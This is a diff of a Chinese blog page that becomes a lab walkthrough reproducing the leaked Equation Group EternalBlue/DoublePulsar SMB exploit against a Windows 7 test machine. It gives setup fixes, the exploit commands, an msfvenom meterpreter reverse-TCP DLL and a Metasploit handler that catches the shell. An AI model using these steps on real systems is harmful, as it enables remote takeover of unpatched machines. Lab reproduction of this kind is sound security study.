@@ -6,17 +6,105 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="https://fupinglee.github.io">
-  <title>Tag: 安卓Hook | 浮萍的个人空间</title>
+  <title>方程式漏洞利用之SMB | 浮萍的个人空间</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="start from zero">
-<meta property="og:type" content="website">
-<meta property="og:title" content="浮萍的个人空间">
-<meta property="og:url" content="https://fupinglee.github.io/tags/安卓Hook/index.html">
+  <meta name="description" content="测试过程中发现了许多问题，导致不成功，记录一下过程以及在其中遇到问题的解决方法
+
+环境搭建
+
+
+主机
+IP
+备注
+
+
+
+
+Win7 64位
+192.168.232.133
+靶机（开启smb）
+
+
+XP
+192.168.232.128
+攻击机1
+
+
+Kali
+192.168.232.134
+攻击机2">
+<meta property="og:type" content="article">
+<meta property="og:title" content="方程式漏洞利用之SMB">
+<meta property="og:url" content="https://fupinglee.github.io/2017/04/15/方程式漏洞利用之SMB/index.html">
 <meta property="og:site_name" content="浮萍的个人空间">
-<meta property="og:description" content="start from zero">
+<meta property="og:description" content="测试过程中发现了许多问题，导致不成功，记录一下过程以及在其中遇到问题的解决方法
+
+环境搭建
+
+
+主机
+IP
+备注
+
+
+
+
+Win7 64位
+192.168.232.133
+靶机（开启smb）
+
+
+XP
+192.168.232.128
+攻击机1
+
+
+Kali
+192.168.232.134
+攻击机2">
+<meta property="og:image" content="https://fupinglee.github.io/2017/04/15/方程式漏洞利用之SMB/python版本.png">
+<meta property="og:image" content="https://fupinglee.github.io/2017/04/15/方程式漏洞利用之SMB/win32pipe错误.png">
+<meta property="og:image" content="https://fupinglee.github.io/2017/04/15/方程式漏洞利用之SMB/找不到指定的模块.png">
+<meta property="og:image" content="https://fupinglee.github.io/2017/04/15/方程式漏洞利用之SMB/解决找不到模块.png">
+<meta property="og:image" content="https://fupinglee.github.io/2017/04/15/方程式漏洞利用之SMB/创建目录.png">
+<meta property="og:image" content="https://fupinglee.github.io/2017/04/15/方程式漏洞利用之SMB/操作1.png">
+<meta property="og:image" content="https://fupinglee.github.io/2017/04/15/方程式漏洞利用之SMB/操作2.png">
+<meta property="og:image" content="https://fupinglee.github.io/2017/04/15/方程式漏洞利用之SMB/操作3.png">
+<meta property="og:image" content="https://fupinglee.github.io/2017/04/15/方程式漏洞利用之SMB/操作4.png">
+<meta property="og:image" content="https://fupinglee.github.io/2017/04/15/方程式漏洞利用之SMB/操作5.png">
+<meta property="og:image" content="https://fupinglee.github.io/2017/04/15/方程式漏洞利用之SMB/操作6.png">
+<meta property="og:image" content="https://fupinglee.github.io/2017/04/15/方程式漏洞利用之SMB/操作7.png">
+<meta property="og:image" content="https://fupinglee.github.io/2017/04/15/方程式漏洞利用之SMB/操作8.png">
+<meta property="og:image" content="https://fupinglee.github.io/2017/04/15/方程式漏洞利用之SMB/成功反弹.png">
+<meta property="og:updated_time" content="2017-04-15T14:36:59.172Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="浮萍的个人空间">
-<meta name="twitter:description" content="start from zero">
+<meta name="twitter:title" content="方程式漏洞利用之SMB">
+<meta name="twitter:description" content="测试过程中发现了许多问题，导致不成功，记录一下过程以及在其中遇到问题的解决方法
+
+环境搭建
+
+
+主机
+IP
+备注
+
+
+
+
+Win7 64位
+192.168.232.133
+靶机（开启smb）
+
+
+XP
+192.168.232.128
+攻击机1
+
+
+Kali
+192.168.232.134
+攻击机2">
+<meta name="twitter:image" content="https://fupinglee.github.io/2017/04/15/方程式漏洞利用之SMB/python版本.png">
   
     <link rel="alternative" href="/atom.xml" title="浮萍的个人空间" type="application/atom+xml">
   
@@ -146,68 +234,201 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="post-方程式漏洞利用之SMB" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2017" class="archive-year">2017</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2017/04/01/Android-HOOK-技术之Frida的初级使用/" class="archive-article-date">
-  	<time datetime="2017-04-01T11:39:15.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-04-01</time>
-</a>
-        </div>
-    	 
+      <header class="article-header">
+        
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2017/04/01/Android-HOOK-技术之Frida的初级使用/">Android HOOK 技术之Frida的初级使用</a>
+    <h1 class="article-title" itemprop="name">
+      方程式漏洞利用之SMB
     </h1>
   
 
-        <div class="article-info info-on-right">
-          
+        
+        <a href="/2017/04/15/方程式漏洞利用之SMB/" class="archive-article-date">
+  	<time datetime="2017-04-15T13:01:45.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-04-15</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <blockquote>
+<p>测试过程中发现了许多问题，导致不成功，记录一下过程以及在其中遇到问题的解决方法</p>
+</blockquote>
+<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><table>
+<thead>
+<tr>
+<th>主机</th>
+<th>IP</th>
+<th>备注</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Win7 64位</td>
+<td>192.168.232.133</td>
+<td>靶机（开启smb）</td>
+</tr>
+<tr>
+<td>XP</td>
+<td>192.168.232.128</td>
+<td>攻击机1</td>
+</tr>
+<tr>
+<td>Kali</td>
+<td>192.168.232.134</td>
+<td>攻击机2</td>
+</tr>
+</tbody>
+</table>
+<a id="more"></a>
+<h5 id="攻击机软件安装"><a href="#攻击机软件安装" class="headerlink" title="攻击机软件安装"></a>攻击机软件安装</h5><p>1.下载<a href="https://github.com/x0rz/EQGRP_Lost_in_Translation/tree/master/windows" target="_blank" rel="external">https://github.com/x0rz/EQGRP_Lost_in_Translation/tree/master/windows</a><br>2.<strong>安装Python2.6 32位</strong><br><img src="/2017/04/15/方程式漏洞利用之SMB/python版本.png" alt="python版本"></p>
+<p>安装后，运行fb.py，发现错误<code>ImportError: No module named win32pipe</code></p>
+<p><img src="/2017/04/15/方程式漏洞利用之SMB/win32pipe错误.png" alt="win32pipe错误"></p>
+<p>搜索后提示需要安装<code>pywin32-216.win32-py2.6.exe</code>，下载地址<a href="https://sourceforge.net/projects/pywin32/files%2Fpywin32/" target="_blank" rel="external">https://sourceforge.net/projects/pywin32/files%2Fpywin32/</a><br>选择对应的版本。<br>结果又发现错误</p>
+<p><img src="/2017/04/15/方程式漏洞利用之SMB/找不到指定的模块.png" alt="找不到指定的模块"></p>
+<p>切换到Python的安装目录的Scripts下，执行命令<code>pywin32_postinstall.py -install</code><br><img src="/2017/04/15/方程式漏洞利用之SMB/解决找不到模块.png" alt="解决找不到模块"></p>
+<p>运行fb.py报错，在fb.py同目录下创建listeningposts文件夹即可<br><img src="/2017/04/15/方程式漏洞利用之SMB/创建目录.png" alt="创建目录"></p>
+<h3 id="验证过程"><a href="#验证过程" class="headerlink" title="验证过程"></a>验证过程</h3><p>运行fb.py后输入靶机和攻击机XP的IP，新建或者用之前的项目<br><img src="/2017/04/15/方程式漏洞利用之SMB/操作1.png" alt="操作1"><br>之后一路回车，需要操作的地方已经标记<br>选择SMB工具模块，使用命令<code>use Eternalblue</code><br><img src="/2017/04/15/方程式漏洞利用之SMB/操作2.png" alt="操作2"><br>选择目标系统<br><img src="/2017/04/15/方程式漏洞利用之SMB/操作3.png" alt="操作3"><br>输入命令<code>use Doublepulsar</code><br><img src="/2017/04/15/方程式漏洞利用之SMB/操作4.png" alt="操作4"><br><img src="/2017/04/15/方程式漏洞利用之SMB/操作5.png" alt="操作5"></p>
+<p>在Kali上生成dll文件，命令如下<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.232.134  LPORT=5555 <span class="_">-f</span> dll &gt; s.dll</div></pre></td></tr></table></figure></p>
+<p>然后copy到XP系统中，记下位置，如C:\s.dll<br>kali上运行msf，具体命令如下<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">msf &gt; use exploit/multi/handler</div><div class="line">msf exploit(handler) &gt; <span class="built_in">set</span> LHOST 192.168.232.134</div><div class="line">LHOST =&gt; 192.168.232.134</div><div class="line">msf exploit(handler) &gt; <span class="built_in">set</span> LPORT 5555</div><div class="line">LPORT =&gt; 5555</div><div class="line">msf exploit(handler) &gt; <span class="built_in">set</span> PAYLOAD windows/x64/meterpreter/reverse_tcp</div><div class="line">PAYLOAD =&gt; windows/x64/meterpreter/reverse_tcp</div><div class="line">msf exploit(handler) &gt; exploit</div></pre></td></tr></table></figure></p>
+<p><img src="/2017/04/15/方程式漏洞利用之SMB/操作6.png" alt="操作6"></p>
+<p>在XP上输入dll文件的位置，一路回车<br><img src="/2017/04/15/方程式漏洞利用之SMB/操作7.png" alt="操作7"><br>显示Doublepulsar Succeeded<br><img src="/2017/04/15/方程式漏洞利用之SMB/操作8.png" alt="操作8"></p>
+<p>查看kali上发现已经反弹shell 了<br><img src="/2017/04/15/方程式漏洞利用之SMB/成功反弹.png" alt="成功反弹"></p>
+<h3 id="结束语"><a href="#结束语" class="headerlink" title="结束语"></a>结束语</h3><p>现在网上已经有很多文章了，这里只是自己验证一下实现的过程，记录一下。其实复现也很容易，只需要输入IP地址和一些选项即可，就是搭建环境的时候有许多错误，注意一下就行了。<br>这里有视频可以看一下<a href="https://v.qq.com/iframe/player.html?vid=g0393qtgvj0&amp;tiny=0&amp;auto=0" target="_blank" rel="external">https://v.qq.com/iframe/player.html?vid=g0393qtgvj0&amp;tiny=0&amp;auto=0</a></p>
+
+      
+
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    
+                    <div class="reward-box-item">
+                      <img class="reward-img" src="/img/wx.jpg">
+                      <span class="reward-type">微信</span>
+                    </div>
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">安卓Hook</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">方程式</a>
         		</li>
       		 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">Frida</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">摇骰子</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">SMB漏洞</a>
         		</li>
       		
 		</ul>
 	</div>
 
-          
+      
 
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="http://s.jiathis.com/qrcode.php?url=https://fupinglee.github.io/2017/04/15/方程式漏洞利用之SMB/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
+  
+<nav id="article-nav">
   
   
-    </div></section>
+    <a href="/2017/04/10/QQ登录简单分析，附易语言登录代码/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">QQ登录简单分析，附易语言登录代码</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+
+
+
+
+  
+    <div class="duoshuo"></div>
   
 
-    
+
 
 
           </div>
@@ -230,9 +451,9 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
+		isPost: true,
 		isArchive: false,
-		isTag: true,
+		isTag: false,
 		isCategory: false,
 		open_in_new: false,
 		root: "/",
